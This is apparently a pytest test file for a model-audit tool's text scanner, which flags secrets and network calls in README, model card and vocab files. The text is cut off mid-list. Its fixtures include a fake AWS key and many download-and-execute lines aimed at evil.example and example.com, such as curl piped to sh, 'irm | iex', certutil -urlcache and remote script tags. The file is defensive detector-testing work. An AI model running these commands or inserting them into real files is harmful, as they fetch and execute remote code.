from pathlib import Path
from typing import Any

import pytest

from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.core import determine_exit_code, scan_file, scan_model_directory_or_file
from modelaudit.scanner_results import SCAN_OUTCOME_MESSAGE_METADATA_KEY
from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
from modelaudit.scanners.text_scanner import TextScanner
from modelaudit.utils.helpers import cache_decorator


def test_text_scanner_handles_routable_vocabulary_file(tmp_path: Path) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("token\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert result.success is True
    assert not result.issues
    assert any(
        check.name == "Embedded Secrets Detection" and check.status == CheckStatus.PASSED for check in result.checks
    )
    assert any(
        check.name == "Network Communication Detection" and check.status == CheckStatus.PASSED
        for check in result.checks
    )


def test_text_scanner_runs_content_security_detectors_for_ml_sidecars(tmp_path: Path) -> None:
    text_path = tmp_path / "vocab.txt"
    aws_key = "AKIAABCDEFGHIJKLMNOP"
    text_path.write_text(
        f"safe-token\naws_access_key_id={aws_key}\ncallback=https://evil.example/payload\n",
        encoding="utf-8",
    )

    result = scan_file(str(text_path), config={"cache_scan_results": False})

    assert result.scanner_name == "text"
    assert any(
        check.name == "Embedded Secrets Detection" and check.status == CheckStatus.FAILED for check in result.checks
    )
    assert any(
        check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )
    assert any(
        check.name == "Text Content Security Coverage" and check.status == CheckStatus.PASSED for check in result.checks
    )


@pytest.mark.parametrize("filename", ["README", "model_card"])
def test_text_scanner_routes_extensionless_documentation_through_security_detectors(
    tmp_path: Path,
    filename: str,
) -> None:
    text_path = tmp_path / filename
    text_path.write_text('requests.get("https://evil.example/payload")\n', encoding="utf-8")

    result = scan_file(str(text_path), config={"cache_scan_results": False})

    assert TextScanner.can_handle(str(text_path))
    assert result.scanner_name == "text"
    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "network_function"
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


@pytest.mark.parametrize(
    ("filename", "expected_type", "content"),
    [
        ("LICENSE", "license", "Microsoft.\r\nCopyright (c) Microsoft Corporation.\r\nPermission is granted.\r\n"),
        ("NOTICE", "notice", "NOTICE\nThis product includes third-party software.\nCopyright 2026 Example.\n"),
    ],
)
def test_text_scanner_routes_legal_sidecars_before_pickle_probe(
    tmp_path: Path,
    filename: str,
    expected_type: str,
    content: str,
) -> None:
    text_path = tmp_path / filename
    text_path.write_text(content, encoding="utf-8")

    result = scan_file(str(text_path), config={"cache_enabled": False})

    assert TextScanner.can_handle(str(text_path))
    assert result.scanner_name == "text"
    assert any(
        check.name == "File Type Identification" and check.details.get("file_type") == expected_type
        for check in result.checks
    )
    assert not any(issue.rule_code in {"S901", "S902"} for issue in result.issues)
    assert not any(check.rule_code in {"S901", "S902"} and "pickle" in check.message.lower() for check in result.checks)


def test_text_scanner_does_not_claim_misleading_pickle_suffix(tmp_path: Path) -> None:
    payload = tmp_path / "LICENSE.pkl"
    payload.write_text("MIT License\nCopyright (c) Example\n", encoding="utf-8")

    assert not TextScanner.can_handle(str(payload))


def test_directory_scan_routes_legal_sidecar_to_text_before_pickle_probe(tmp_path: Path) -> None:
    license_path = tmp_path / "LICENSE"
    license_path.write_text(
        "Microsoft.\r\nCopyright (c) Microsoft Corporation.\r\nPermission is hereby granted.\r\n",
        encoding="utf-8",
    )

    result = scan_model_directory_or_file(str(tmp_path), cache_enabled=False)

    assert result.files_scanned == 1
    assert result.scanner_names == ["text"]
    assert not any(issue.rule_code in {"S901", "S902"} for issue in result.issues)


@pytest.mark.parametrize("filename", ["README.en.md", "model_card.en.md", "modelcard.fr.rst"])
def test_text_scanner_routes_localized_documentation_through_security_detectors(
    tmp_path: Path,
    filename: str,
) -> None:
    text_path = tmp_path / filename
    text_path.write_text('requests.get("https://evil.example/payload")\n', encoding="utf-8")

    result = scan_file(str(text_path), config={"cache_scan_results": False})

    assert TextScanner.can_handle(str(text_path))
    assert result.scanner_name == "text"
    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "network_function"
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


@pytest.mark.parametrize(
    "filename",
    [
        "README.md.bak",
        "README.png",
        "model_card.md.bak",
        "model_card.en.md.bak",
        "model_card.png",
        "model_cardish.md",
        "modelcard",
    ],
)
def test_text_scanner_does_not_claim_documentation_near_matches(tmp_path: Path, filename: str) -> None:
    text_path = tmp_path / filename
    text_path.write_text('requests.get("https://evil.example/payload")\n', encoding="utf-8")

    assert not TextScanner.can_handle(str(text_path))


def test_text_scanner_does_not_claim_arbitrary_extensionless_text(tmp_path: Path) -> None:
    text_path = tmp_path / "notes"
    text_path.write_text('requests.get("https://evil.example/payload")\n', encoding="utf-8")

    assert not TextScanner.can_handle(str(text_path))


def test_text_scanner_documentation_urls_are_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("Documentation: https://docs.example.com/model-card\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    network_issues = [
        issue for issue in result.issues if issue.type == "text_check" and "detected" in issue.message.lower()
    ]
    assert network_issues
    assert all(issue.severity == IssueSeverity.INFO for issue in network_issues)
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


@pytest.mark.parametrize("filename", ["model_card.txt", "modelcard.md"])
def test_text_scanner_model_card_aliases_preserve_executable_network_findings(
    tmp_path: Path,
    filename: str,
) -> None:
    text_path = tmp_path / filename
    text_path.write_text('requests.get("https://evil.example/payload")\n', encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert TextScanner.can_handle(str(text_path))
    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "network_function"
        and check.details.get("function") == "requests.get"
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


@pytest.mark.parametrize("filename", ["model_card.txt", "modelcard.md"])
def test_text_scanner_model_card_aliases_keep_documentation_urls_informational(
    tmp_path: Path,
    filename: str,
) -> None:
    text_path = tmp_path / filename
    text_path.write_text("Documentation: https://docs.example.com/model-card\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert determine_exit_code(aggregate) == 0


@pytest.mark.parametrize(
    "content",
    [
        "Project URL: https://example.com/project\n",
        "Dataset URL: https://example.com/dataset\n",
        "class labels are documented at https://example.com/classes\n",
        "def examples are documented at https://example.com/functions\n",
        "Lambda: https://docs.aws.amazon.com/lambda/\n",
        "lambda docs: https://example.com/functions\n",
        "Webhook documentation: https://docs.example.com/webhooks\n",
        "C2 research: https://example.com/security\n",
        "config = {}  # docs: https://example.com/configuration\n",
        "[Documentation](https://example.com/reference)\n",
        "![Model diagram](https://example.com/model.png)\n",
        "> - [Documentation](https://example.com/reference)\n",
        'def load():\n    """See https://docs.example.com/reference."""\n',
        "The result = https://example.com/reference in this example.\n",
        'The result = "https://example.com/reference" in this example.\n',
    ],
)
def test_text_scanner_generic_documentation_url_labels_are_informational(
    tmp_path: Path,
    content: str,
) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert determine_exit_code(aggregate) == 0


@pytest.mark.parametrize(
    "content",
    [
        'class Loader: "https://evil.example/payload"\n',
        'def load(): return "https://evil.example/payload"\n',
        'class Loader:\n    source = "https://evil.example/payload"\n',
        'def load():\n    return "https://evil.example/payload"\n',
        'class Loader:\n    def endpoint(self):\n        if enabled:\n            return "https://evil.example/payload"\n',
        'def load():\n    if enabled:\n        return "https://evil.example/payload"\n',
    ],
)
def test_text_scanner_python_definitions_with_urls_remain_actionable(tmp_path: Path, content: str) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "url_detected"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


@pytest.mark.parametrize(
    "content",
    [
        '<a href="https://example.com/docs">Documentation</a>\n',
        "<img src='https://example.com/model.png' alt='Model diagram'>\n",
        '<a\n  href="https://example.com/docs">Documentation</a>\n',
    ],
)
def test_text_scanner_passive_html_links_are_informational(tmp_path: Path, content: str) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert determine_exit_code(aggregate) == 0


def test_text_scanner_executable_html_resource_remains_actionable(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text('<script src="https://evil.example/payload.js"></script>\n', encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "url_detected"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


@pytest.mark.parametrize(
    "content",
    [
        '<!-- requests.get("https://evil.example/payload") -->\n',
        "<!-- endpoint: https://evil.example/payload -->\n",
        '/* requests.get("https://evil.example/payload") */\n',
    ],
)
def test_text_scanner_documentation_block_comments_are_informational(tmp_path: Path, content: str) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_text_scanner_code_after_closed_documentation_comment_remains_actionable(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(
        '<!-- requests.get("https://docs.example.com/reference") -->\nrequests.get("https://evil.example/payload")\n',
        encoding="utf-8",
    )

    result = TextScanner().scan(str(text_path))

    assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


@pytest.mark.parametrize("comment", ["<!-- requests.get(endpoint) -->", "/* requests.get(endpoint) */"])
def test_text_scanner_commented_occurrence_does_not_hide_later_network_call(
    tmp_path: Path,
    comment: str,
) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(f"{comment}\nrequests.get(endpoint)\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "network_function"
        and check.details.get("function") == "requests.get"
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


@pytest.mark.parametrize(
    "content",
    [
        'download(marker="/*", url="https://evil.example/payload")\n',
        'download(marker="<!--", url="https://evil.example/payload")\n',
        'const marker = "/*"; fetch("https://evil.example/payload")\n',
        'const marker = `/*`; fetch("https://evil.example/payload")\n',
        'const marker = `<!--`; fetch("https://evil.example/payload")\n',
    ],
)
def test_text_scanner_comment_delimiters_inside_strings_do_not_hide_code(
    tmp_path: Path,
    content: str,
) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_text_scanner_truncated_quote_state_does_not_hide_code(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(
        'download("' + ("A" * (4096 + 4)) + '/* https://evil.example/payload")\n',
        encoding="utf-8",
    )

    result = TextScanner().scan(str(text_path))

    assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_text_scanner_documentation_network_api_prose_is_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("Use requests.get to download weights.\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "network_function"
        and check.details.get("function") == "requests.get"
        and check.severity == IssueSeverity.INFO
        for check in result.checks
    )
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert determine_exit_code(aggregate) == 0


@pytest.mark.parametrize(
    "content",
    [
        'print("Use requests.get to download weights")\n',
        'logger.info("Use requests.get to download weights")\n',
    ],
)
def test_text_scanner_network_api_string_literals_are_informational(tmp_path: Path, content: str) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "network_function"
        and check.details.get("function") == "requests.get"
        and check.severity == IssueSeverity.INFO
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 0


def test_text_scanner_f_string_literal_network_api_text_is_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text('message = f"Use requests.get to download weights"\n', encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "network_function"
        and check.details.get("function") == "requests.get"
        and check.severity == IssueSeverity.INFO
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 0


@pytest.mark.parametrize("prefix", ["f", "rf"])
def test_text_scanner_f_string_expression_network_calls_remain_actionable(
    tmp_path: Path,
    prefix: str,
) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(f'message = {prefix}"{{requests.get(endpoint)}}"\n', encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "network_function"
        and check.details.get("function") == "requests.get"
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


def test_text_scanner_nested_network_api_call_remains_actionable(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text('print(requests.get("https://evil.example/payload"))\n', encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "network_function"
        and check.details.get("function") == "requests.get"
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


def test_text_scanner_later_network_api_call_is_not_hidden_by_prose(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(
        'Use requests.get to download weights.\nrequests.get("https://evil.example/payload")\n',
        encoding="utf-8",
    )

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "network_function"
        and check.details.get("function") == "requests.get"
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


def test_text_scanner_documentation_network_library_prose_is_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("To use it, import requests before downloading weights.\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "network_library"
        and check.details.get("library") == "requests"
        and check.severity == IssueSeverity.INFO
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 0


@pytest.mark.parametrize(
    "content",
    [
        'print("import requests before downloading weights")\n',
        'logger.info("import requests before downloading weights")\n',
        'message = f"import requests before downloading weights"\n',
    ],
)
def test_text_scanner_network_library_string_literals_are_informational(
    tmp_path: Path,
    content: str,
) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "network_library"
        and check.details.get("library") == "requests"
        and check.severity == IssueSeverity.INFO
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 0


def test_text_scanner_imperative_network_import_prose_is_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("import requests before downloading weights.\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "network_library"
        and check.details.get("library") == "requests"
        and check.severity == IssueSeverity.INFO
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 0


def test_text_scanner_later_network_library_import_is_not_hidden_by_prose(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(
        "To use it, import requests before downloading weights.\nimport requests\n",
        encoding="utf-8",
    )

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "network_library"
        and check.details.get("library") == "requests"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


def test_text_scanner_python_prompt_import_remains_actionable(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(">>> import socket\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "network_library"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


def test_text_scanner_python_prompt_import_prose_remains_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(">>> import socket for troubleshooting examples.\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


@pytest.mark.parametrize(
    "content",
    [
        "- import socket\n",
        "1. import requests\n",
        "> import socket\n",
        "> - >>> import requests\n",
        "`import socket`\n",
        "`from requests import get`\n",
    ],
)
def test_text_scanner_markdown_prefixed_imports_remain_actionable(tmp_path: Path, content: str) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "network_library"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


@pytest.mark.parametrize(
    "content",
    [
        "- import requests before downloading weights.\n",
        "> import socket for troubleshooting examples.\n",
        "`import socket for troubleshooting examples.`\n",
    ],
)
def test_text_scanner_markdown_prefixed_import_prose_is_informational(tmp_path: Path, content: str) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert determine_exit_code(aggregate) == 0


@pytest.mark.parametrize(
    "content",
    [
        'requests.request("GET", endpoint)\n',
        'if enabled: requests.request("GET", endpoint)\n',
        "if enabled: import requests\n",
        "for _ in [0]: import socket  # examples\n",
        "match mode: case _: import socket\n",
        "async for item in stream: import socket\n",
        "x = 1; import requests\n",
        "setup(); import requests\n",
        "if enabled: pass; import requests\n",
        "async def load(): import socket\n",
        "executor.submit(requests.request, 'GET', endpoint)\n",
        'socket.request("/")\n',
    ],
)
def test_text_scanner_executable_network_library_usage_remains_actionable(
    tmp_path: Path,
    content: str,
) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "network_library"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


def test_text_scanner_semicolon_prose_network_import_is_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(
        "For example; import socket for troubleshooting.\nFor example: import requests before use.\n",
        encoding="utf-8",
    )

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert determine_exit_code(aggregate) == 0


def test_text_scanner_later_compound_network_import_is_not_hidden_by_prose(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(
        "To use it, import requests before downloading weights.\nif enabled: import requests\n",
        encoding="utf-8",
    )

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "network_library"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


def test_text_scanner_earlier_network_library_call_is_not_hidden_by_later_prose(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(
        'requests.request("GET", endpoint)\nTo use it, import requests before downloading weights.\n',
        encoding="utf-8",
    )

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "network_library"
        and check.details.get("pattern") == "requests.request"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


@pytest.mark.parametrize(
    "content",
    [
        'sh -c "$(curl https://evil.example/payload)"\n',
        'sh -c "sudo curl https://evil.example/payload | sh"\n',
        'bash -c "sudo -u nobody HTTPS_PROXY=http://proxy.internal wget https://evil.example/payload"\n',
        'bash -e -c "curl https://evil.example/payload | sh"\n',
        'bash -lc "wget https://evil.example/payload"\n',
        "cmd /c curl https://evil.example/payload\n",
        "cmd.exe /C wget https://evil.example/payload\n",
        "curl.exe https://evil.example/payload\n",
        "wget.exe https://evil.example/payload\n",
        "irm https://evil.example/payload | iex\n",
        "Invoke-RestMethod https://evil.example/payload\n",
        'echo ready; sh -c "sudo curl https://evil.example/payload | sh"\n',
        "PS> iwr https://evil.example/payload\n",
        "`$ curl https://evil.example/payload | sh`\n",
        "$(wget https://evil.example/payload)\n",
        "`curl https://evil.example/payload`\n",
        'echo "$(curl https://evil.example/payload)"\n',
    ],
)
def test_text_scanner_documentation_shell_substitution_remains_actionable(
    tmp_path: Path,
    content: str,
) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert determine_exit_code(aggregate) == 1


@pytest.mark.parametrize(
    "content",
    [
        "Use sh -c with sudo and curl when appropriate; see https://docs.example.com/shell.\n",
        "bash -lc is documented at https://docs.example.com/shell.\n",
        "cmd /c is documented at https://docs.example.com/cmd.\n",
        "curl.exe is documented at https://docs.example.com/curl.\n",
        "Invoke-RestMethod documentation: https://docs.example.com/powershell.\n",
        "PS> is the prompt shown at https://docs.example.com/powershell.\n",
        "`Use curl for downloads`; see https://docs.example.com/shell.\n",
    ],
)
def test_text_scanner_shell_interpreter_wrapper_prose_remains_informational(
    tmp_path: Path,
    content: str,
) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert determine_exit_code(aggregate) == 0


@pytest.mark.parametrize(
    "content",
    [
        "env -i curl https://example.com/artifact | sh\n",
        "env --ignore-environment wget https://example.com/artifact\n",
        "env -u HTTP_PROXY curl https://example.com/artifact | sh\n",
        "env --unset HTTP_PROXY wget https://example.com/artifact\n",
        "env -C /tmp curl https://example.com/artifact | sh\n",
        "env -S 'curl https://example.com/artifact | sh'\n",
        "env --split-string='wget https://example.com/artifact | sh'\n",
        "RUN curl https://example.com/artifact | sh\n",
        "RUN --mount=type=cache curl https://example.com/artifact | sh\n",
        "Example: curl https://example.com/artifact | sh\n",
        "Example: RUN sudo curl https://example.com/artifact | sh\n",
        'bash -e -c "curl https://example.com/artifact | sh"\n',
        'bash -lc "wget https://example.com/artifact"\n',
        "cmd /c curl https://example.com/artifact\n",
        "cmd.exe /C wget https://example.com/artifact\n",
        "irm https://example.com/artifact | iex\n",
        "Invoke-RestMethod https://example.com/artifact\n",
        "curl.exe https://example.com/artifact\n",
        "wget.exe https://example.com/artifact\n",
        "command curl https://example.com/artifact\n",
        "exec wget https://example.com/artifact\n",
        "nohup curl https://example.com/artifact &\n",
        'eval "curl https://example.com/artifact"\n',
        "echo https://example.com/artifact | xargs curl\n",
        "xargs curl https://example.com/artifact\n",
        'RUN ["curl", "https://example.com/artifact"]\n',
        'CMD ["wget", "https://example.com/artifact"]\n',
        'command: ["curl", "https://example.com/artifact"]\n',
        "/usr/bin/curl https://example.com/artifact\n",
        'RUN ["/usr/bin/curl", "https://example.com/artifact"]\n',
        'ENTRYPOINT ["sh", "-c", "curl https://example.com/artifact"]\n',
        'RUN ["/bin/bash", "-lc", "wget https://example.com/artifact"]\n',
        'RUN ["sh", "-c", "curl https://example.com/artifact | sh"]\n',
        'RUN ["bash", "-e", "-c", "curl https://example.com/artifact | sh"]\n',
        "busybox wget https://example.com/artifact | sh\n",
        "toybox wget https://example.com/artifact\n",
        "sudo -- curl https://example.com/artifact | sh\n",
        "env -- wget https://example.com/artifact\n",
        "command -- curl https://example.com/artifact | sh\n",
        "timeout 5 curl https://example.com/artifact | sh\n",
        "timeout --signal KILL 5 curl https://example.com/artifact | sh\n",
        "nice -n 10 wget https://example.com/artifact\n",
        "setsid curl https://example.com/artifact\n",
        "time -p curl https://example.com/artifact\n",
        "find . -exec curl https://example.com/artifact {} ;\n",
        "# curl https://example.com/artifact | sh\n",
        "certutil -urlcache -f https://example.com/artifact artifact.exe\n",
        'certutil -urlcache -f "https://example.com/artifact" artifact.exe\n',
        "pwsh -NoProfile -Command iwr https://example.com/artifact\n",
        "pwsh -NoProfile iwr https://example.com/artifact\n",
        "echo ready; pwsh -NoProfile -Command iwr https://example.com/artifact\n",
        "ADD https://example.com/artifact /tmp/artifact\n",
        "ADD --checksum=sha256:abc https://example.com/artifact /tmp/artifact\n",
        "# curl \\\n  https://example.com/artifact | sh\n",
        "certutil.exe -f -urlcache https://example.com/artifact artifact.exe\n",
        "> - curl https://example.com/artifact | sh\n",
        "> 1. wget https://example.com/artifact\n",
    ],
)
def test_text_scanner_documentation_command_prefixes_remain_actionable(tmp_path: Path, content: str) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "url_detected"
        and check.details.get("url") == "https://example.com/artifact"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


@pytest.mark.parametrize(
    "content",
    [
        "The env -i option is documented at https://docs.example.com/env.\n",
        "env -u curl https://example.com/artifact\n",
        "env --unset wget https://example.com/artifact\n",
        "env -C curl https://example.com/artifact\n",
        "env -S 'curl is documented at https://docs.example.com/env'\n",
        "RUN documents curl at https://docs.example.com/docker.\n",
        "RUN --mount documents curl at https://docs.example.com/docker.\n",
        "Example: use curl for downloads; see https://docs.example.com/shell.\n",
        "Use bash -lc for login shells; see https://docs.example.com/shell.\n",
        "The cmd /c curl syntax is documented at https://docs.example.com/cmd.\n",
        "Use irm for REST calls; see https://docs.example.com/powershell.\n",
        "curl.exe is documented at https://docs.example.com/windows.\n",
        "The command and exec builtins are documented at https://docs.example.com/shell.\n",
        "The sudo -- and env -- forms are documented at https://docs.example.com/options.\n",
        "The busybox wget applet is documented at https://docs.example.com/busybox.\n",
        "Use timeout with curl; see https://docs.example.com/timeout.\n",
        "The timeout --signal option is documented at https://docs.example.com/timeout.\n",
        "The nice and setsid wrappers are documented at https://docs.example.com/processes.\n",
        "Use time -p to measure curl; see https://docs.example.com/time.\n",
        "The find -exec curl pattern is documented at https://docs.example.com/find.\n",
        'The command array ["curl", URL] is documented at https://docs.example.com/config.\n',
        "The `find | xargs curl` pattern is documented at https://docs.example.com/xargs.\n",
        "/usr/bin/curl is documented at https://docs.example.com/shell.\n",
        "Docker ADD documentation: https://docs.example.com/dockerfile.\n",
